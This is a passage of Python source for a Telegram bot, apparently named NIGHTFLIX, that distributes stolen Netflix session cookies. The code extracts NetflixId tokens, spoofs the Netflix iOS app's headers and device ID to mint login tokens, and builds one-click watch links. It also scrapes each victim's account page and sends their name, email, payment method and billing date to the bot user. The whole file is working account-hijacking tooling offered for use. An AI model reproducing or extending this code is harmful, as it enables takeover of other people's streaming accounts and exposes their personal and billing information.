                    types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
                ))
                return

            cookie_content = cookie_row["key_id"]       # real Netscape cookie
            public_id      = cookie_row["public_id"]     # e.g. CLY_C1MDJXBC
            service_type   = cookie_row["service_type"]  # e.g. Netflix Premium DE
            country        = cookie_row.get("country") or "N/A"
            used_now       = user["used"][tier]
            remaining      = max(0, 3 - used_now)
            tier_label     = tier.upper()

            # ── Parse plan & country from service_type ──
            # service_type example: "Netflix Premium DE"
            parts = service_type.split()  # ["Netflix", "Premium", "DE"]
            plan_name = parts[1] if len(parts) > 1 else tier_label
            country_from_type = parts[2] if len(parts) > 2 else country

            # ── Delivery message ──
            filename = f"[{plan_name}][Netflix Cookie][{country_from_type}][{public_id}][Tested By @caydigitals].txt"
            delivery_text = (
                f"🎉 👑 <b>{tier_label} COOKIE — ✅ LIVE</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📁 <b>DATABASE ID:</b> <code>{public_id}</code>\n"
                f"🌍 <b>COUNTRY:</b> <code>{country_from_type}</code>\n"
                f"📊 <b>HOURLY LIMIT:</b> <code>{used_now} / 3</code>\n"
                f"🔒 <b>REMAINING SLOTS:</b> <code>{remaining} claims left</code>\n"
                f"⏱ <b>COOLDOWN PERIOD:</b> <code>1 hour rolling</code>\n\n"
                f"📤 <b>STATUS:</b> Session verified & active! Cookies sent below."
            )
            netflix_delivery_markup = types.InlineKeyboardMarkup()
            netflix_delivery_markup.add(types.InlineKeyboardButton(f"🔄 Get Another {tier_label}", callback_data=f"tier_{tier}"))
            netflix_delivery_markup.add(types.InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu"))
            edit_current_message(call, delivery_text, netflix_delivery_markup)

            # ── Send real cookie file ──
            import io
            file_bytes = io.BytesIO(cookie_content.encode())
            file_bytes.name = filename
            bot.send_document(chat_id, file_bytes, caption=(
                f"🎬 <b>Netflix {plan_name} Cookie</b>\n\n"
                f"📁 <b>ID:</b> <code>{public_id}</code>\n"
                f"🌍 <b>Country:</b> <code>{country_from_type}</code>"
            ), parse_mode="HTML")

            # ── Run checker on the cookie ──
            nftoken_msg = bot.send_message(
                chat_id,
                f"🔍 <b>Generating NFToken:</b> <code>[Parsing Cookie]</code> ⏳",
                parse_mode="HTML"
            )
            time.sleep(1.5)
            bot.edit_message_text(chat_id=chat_id, message_id=nftoken_msg.message_id,
                text=f"🔑 <b>Generating NFToken:</b> <code>[Authenticating Session]</code> ⏳", parse_mode="HTML")
            time.sleep(1.5)
            bot.edit_message_text(chat_id=chat_id, message_id=nftoken_msg.message_id,
                text=f"⚙️ <b>Generating NFToken:</b> <code>[Calling Cay APIs]</code> ⏳", parse_mode="HTML")
            time.sleep(1.5)
            bot.edit_message_text(chat_id=chat_id, message_id=nftoken_msg.message_id,
                text=f"🔗 <b>Generating NFToken:</b> <code>[Building Watch Links]</code> ⏳", parse_mode="HTML")
            time.sleep(1.5)

            # ── Build real NFToken from cookie ──
            from urllib3.exceptions import InsecureRequestWarning
            import requests as req
            req.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

            # Parse NetflixId from netscape cookie content
            netflix_id = None
            secure_netflix_id = None
            for line in cookie_content.splitlines():
                parts_line = line.strip().split("\t")
                if len(parts_line) >= 7:
                    if parts_line[5] == "NetflixId":
                        netflix_id = parts_line[6]
                    elif parts_line[5] == "SecureNetflixId":
                        secure_netflix_id = parts_line[6]

            nf_token = None

            if netflix_id:
                try:
                    import requests as req
                    from urllib3.exceptions import InsecureRequestWarning
                    req.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

                    nftoken_headers = {
                        "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
                        "Cookie": f"NetflixId={netflix_id}" + (f"; SecureNetflixId={secure_netflix_id}" if secure_netflix_id else ""),
                        "x-netflix.request.attempt": "1",
                        "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
                        "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
                        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
                        "x-netflix.context.app-version": "15.48.1",
                        "x-netflix.argo.translated": "true",
                        "x-netflix.context.form-factor": "phone",
                        "x-netflix.context.sdk-version": "2012.4",
                        "x-netflix.client.appversion": "15.48.1",
                        "x-netflix.context.max-device-width": "375",
                        "x-netflix.context.ab-tests": "",
                        "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
                        "x-netflix.client.type": "argo",
                        "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
                        "x-netflix.context.locales": "en-US",
                        "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
                        "x-netflix.client.iosversion": "15.8.5",
                        "accept-language": "en-US;q=1",
                        "x-netflix.argo.abtests": "",
                        "x-netflix.context.os-version": "15.8.5",
                        "x-netflix.request.client.context": '{"appState":"foreground"}',
                        "x-netflix.context.ui-flavor": "argo",
                        "x-netflix.argo.nfnsm": "9",
                        "x-netflix.context.pixel-density": "2.0",
                        "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
                        "x-netflix.request.client.timezoneid": "Asia/Dhaka",
                    }
                    nftoken_params = {
                        "appVersion": "15.48.1",
                        "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true"}',
                        "device_type": "NFAPPL-02-",
                        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
                        "idiom": "phone",
                        "iosVersion": "15.8.5",
                        "isTablet": "false",
                        "languages": "en-US",
                        "locale": "en-US",
                        "maxDeviceWidth": "375",
                        "model": "saget",
                        "modelType": "IPHONE8-1",
                        "odpAware": "true",
                        "path": '["account","token","default"]',
                        "pathFormat": "graph",
                        "pixelDensity": "2.0",
                        "progressive": "false",
                        "responseFormat": "json",
                    }
                    r = req.get(
                        "https://ios.prod.ftl.netflix.com/iosui/user/15.48",
                        params=nftoken_params,
                        headers=nftoken_headers,
                        timeout=30,
                        verify=False,
                    )
                    if r.status_code == 200:
                        token_data = (
                            (((r.json().get("value") or {}).get("account") or {})
                            .get("token") or {}).get("default") or {}
                        )
                        nf_token = token_data.get("token")
                except Exception as e:
                    print(f"NFToken error: {e}")
                    nf_token = None


            # ── Get real account info from Netflix ──
            import requests as req
            session = req.Session()
            session.cookies.set("NetflixId", netflix_id)
            if secure_netflix_id:
                session.cookies.set("SecureNetflixId", secure_netflix_id)

            account_info = {}
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                    "Accept-Encoding": "identity",
                }
                resp = session.get("https://www.netflix.com/account/membership", headers=headers, timeout=15)
                if resp.status_code == 200:
                    account_info = extract_info(resp.text)
            except Exception as e:
                print(f"Account info error: {e}")

            # Pull fields
            email       = account_info.get("email") or "N/A"
            name        = account_info.get("accountOwnerName") or "N/A"
            country     = account_info.get("countryOfSignup") or country_from_type
            plan_real   = account_info.get("localizedPlanName") or f"Netflix {plan_name}"
            streams     = (account_info.get("maxStreams") or "N/A")
            quality     = account_info.get("videoQuality") or "N/A"
            next_bill   = account_info.get("nextBillingDate") or "N/A"
            payment     = account_info.get("paymentMethodType") or "N/A"
            member_since = account_info.get("memberSince") or "N/A"
            profiles    = account_info.get("profilesDisplay") or "N/A"

            # ── Build account detail message ──
            account_detail_text = (
                f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 <b>NAME:</b> <code>{name}</code>\n"
                f"📧 <b>EMAIL:</b> <code>{email}</code>\n"
                f"🌍 <b>COUNTRY:</b> <code>{country}</code>\n"
                f"📦 <b>PLAN:</b> <code>{plan_real}</code>\n"
                f"🎞️ <b>QUALITY:</b> <code>{quality}</code>\n"
                f"📺 <b>STREAMS:</b> <code>{streams}</code>\n"
                f"📅 <b>MEMBER SINCE:</b> <code>{member_since}</code>\n"
                f"🗓️ <b>NEXT BILLING:</b> <code>{next_bill}</code>\n"
                f"💳 <b>PAYMENT:</b> <code>{payment}</code>\n"
                f"🎭 <b>PROFILES:</b> <code>{profiles}</code>\n"
                f"🆔 <b>DATABASE ID:</b> <code>{public_id}</code>\n"
            )

            if nf_token:
                watch_browser = f"https://netflix.com/?nftoken={nf_token}"
                watch_mobile  = f"https://netflix.com/unsupported?nftoken={nf_token}"
                account_detail_text += (
                    f"\n🔑 ✅ <b>NFTOKEN WATCH LINKS:</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🖥️ <a href='{watch_browser}'>Watch on PC</a>\n"
                    f"📱 <a href='{watch_mobile}'>Watch on Mobile</a>\n"
                )
            else:
                account_detail_text += f"\n⚠️ <b>NFTOKEN:</b> <code>Could not generate</code>"

            bot.edit_message_text(
                chat_id=chat_id,
                message_id=nftoken_msg.message_id,
                text=account_detail_text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )


            if nf_token:
                watch_browser = f"https://netflix.com/?nftoken={nf_token}"
                watch_mobile  = f"https://netflix.com/unsupported?nftoken={nf_token}"
                watch_tv      = f"https://nflx.it/tv/{nf_token}"
                nftoken_display = nf_token
            else:
                # Fallback if NFToken fails
                nftoken_display = "Unavailable"
                watch_browser = watch_mobile = watch_tv = None

            # ── Account details ──
            account_detail_text = (
                f"📋 📋 <b>ACCOUNT DETAILS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📦 <b>PLAN:</b> <code>Netflix {plan_name}</code>\n"
                f"🌍 <b>COUNTRY:</b> <code>{country_from_type}</code>\n"
                f"🆔 <b>DATABASE ID:</b> <code>{public_id}</code>\n"
            )
            if nf_token:
                account_detail_text += (
                    f"\n🔑 ✅ <b>NFTOKEN WATCH LINKS:</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🖥️ <a href='{watch_browser}'>Watch on PC</a>\n"
                    f"📱 <a href='{watch_mobile}'>Watch on Mobile</a>\n"
                )
            else:
                account_detail_text += f"\n⚠️ <b>NFTOKEN:</b> <code>Could not generate — cookie may need re-check</code>"

            bot.edit_message_text(
                chat_id=chat_id,
                message_id=nftoken_msg.message_id,
                text=account_detail_text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

    elif data == "status":
        text, markup = build_status(chat_id, lang)
        edit_current_message(call, text, markup)

    elif data == "stock":
        text, markup = build_stock(lang)
        edit_current_message(call, text, markup)

    elif data == "help":
        text, markup = build_help(lang)
        edit_current_message(call, text, markup)

    elif data == "language":
        text, markup = build_lang(lang)
        edit_current_message(call, text, markup)

    elif data.startswith("lang_"):
        lang_code    = data.split("_", 1)[1]
        user["lang"] = lang_code
        lang         = lang_code
        lang_name    = languages.get_lang_name(lang)
        text, markup = build_home(chat_id, lang)
        # Prepend confirmation to the home page text
        edit_current_message(call, f"✅ <b>Language set to {lang_name}</b>")
        time.sleep(0.8)
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

    elif data.startswith("admin_set_") and chat_id in ADMIN_IDS:
        tier = data.replace("admin_set_", "")
        ADMIN_PENDING[chat_id] = tier
        bot.send_message(
            chat_id,
            f"✏️ <b>Set stock for <code>{tier.upper()}</code></b>\n\n"
            f"Current value: <code>{STOCK.get(tier, 0)}</code>\n"
            f"Send the new number now:",
            parse_mode="HTML"
        )

    elif data == "admin_reset_all" and chat_id in ADMIN_IDS:
        for key in STOCK:
            STOCK[key] = 0
        edit_current_message(
            call,
            "✅ <b>All stocks reset to 0.</b>",
            admin_stock_markup()
        )

    elif data.startswith("by_country_"):
        # e.g. by_country_netflix — show country usage hint
        edit_current_message(call, languages.get_text(lang, "country_usage"))

    elif data.startswith("country_"):
        # e.g. country_netflix_IN
        parts   = data.split("_", 2)
        service = parts[1]
        country = parts[2]
        edit_current_message(
            call,
            f"🔍 Searching <b>{service.title()}</b> cookies for <b>{country}</b>..."
        )
        time.sleep(1.5)
        if STOCK.get(service, 0) > 0:
            url = f"https://example.com/nftoken/{service}-{country.lower()}-{int(time.time())}"
            edit_current_message(
                call,
                f"✅ <b>{service.upper()} COOKIE DELIVERED ({country})!</b>\n\n"
                f"🔗 <code>{url}</code>\n\nImport the cookie and open the link.\nUse responsibly!",
                main_menu_markup(lang)
            )
        else:
            edit_current_message(
                call,
                f"❌ <b>No {service.title()} cookies available for {country}.</b>",
                main_menu_markup(lang)
            )

    bot.answer_callback_query(call.id)

# ====================== RUN ======================
if __name__ == "__main__":
    print("🚀 NIGHTFLIX Bot is running...")
    sync_stock_from_db()
    bot.delete_webhook(drop_pending_updates=True)
    bot.get_updates(offset=-1)
    bot.set_my_commands([
        types.BotCommand("start",   "Open the main menu"),
        types.BotCommand("admin",   "Admin panel (owner only)"),
        types.BotCommand("status",  "Check your usage limits"),
        types.BotCommand("stock",   "View available cookie stock"),
        types.BotCommand("country", "Get cookies for a specific country"),
        types.BotCommand("lang",    "Change language / Cambiar idioma"),
    ])
    bot.infinity_polling()
